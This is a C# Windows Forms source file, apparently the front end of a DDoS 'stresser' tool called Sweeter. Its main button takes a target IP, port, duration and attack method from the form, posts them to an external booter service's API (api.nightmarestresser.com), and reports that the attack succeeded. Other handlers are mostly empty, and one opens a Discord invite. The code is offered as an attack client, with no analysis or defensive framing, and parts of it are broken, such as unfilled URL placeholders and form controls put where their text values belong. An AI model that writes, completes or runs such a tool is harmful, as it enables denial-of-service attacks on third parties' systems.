using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sweeter
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {

            string f = IP.Text;
            string l = PORT.Text;
            string r = TIME.Text;
            string k = METHODE.Text;
            label7.Text = f + " ";
            label8.Text = l + " ";
            label11.Text = r + " ";
            label9.Text = k + " ";
            WebClient wc = new WebClient { };
            var resp = wc.UploadString("https://api.nightmarestresser.com/?key=[KEY]&method=[METHOD]&host=[HOST]&port=[PORT]&time=[TIME]", "POST",
                $"{{ \"target\":\"{IP}\", \"port\": {PORT}, \"duration\": {TIME}, \"method\": \"{METHODE}\"}}");
            MessageBox.Show("Attack was Succesfully");





        }

        private void PnlFormLoader_Paint(object sender, PaintEventArgs e)
        {
            
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            
            
            
            string t = guna2TextBox6.Text;
            string c = guna2TextBox4.Text;
            string s = guna2ComboBox2.Text;
            label12.Text = t + " ";
            label14.Text = c + " ";
            label15.Text = s + " ";
        }

        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.PnlFormLoader.Controls.Clear();
            Form3 form3_Vrb = new Form3() { Dock = DockStyle.Fill, TopLevel = false, TopMost = true };
            form3_Vrb.FormBorderStyle = FormBorderStyle.None;
            this.PnlFormLoader.Controls.Add(form3_Vrb);
            form3_Vrb.Show();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void guna2ProgressBar2_ValueChanged(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label12_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void guna2ProgressBar3_ValueChanged(object sender, EventArgs e)
        {

        }

        private void guna2ProgressBar4_ValueChanged(object sender, EventArgs e)
        {

        }

        private void guna2ProgressBar7_ValueChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void guna2ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox6_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2ProgressBar1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://discord.gg/rSphS4qGCQ");
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {
            Form3 main = new Form3();
            main.Show();
            this.Hide();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Form2 main = new Form2();
            main.Show();
            this.Hide();
        }

        private void button9_Click(object sender, EventArgs e)
        {

        }

        private void button10_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void IP_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Form4 main = new Form4();
            main.Show();
            this.Hide();
        }

        private void button11_Click(object sender, EventArgs e)
        {

        }
    }
}
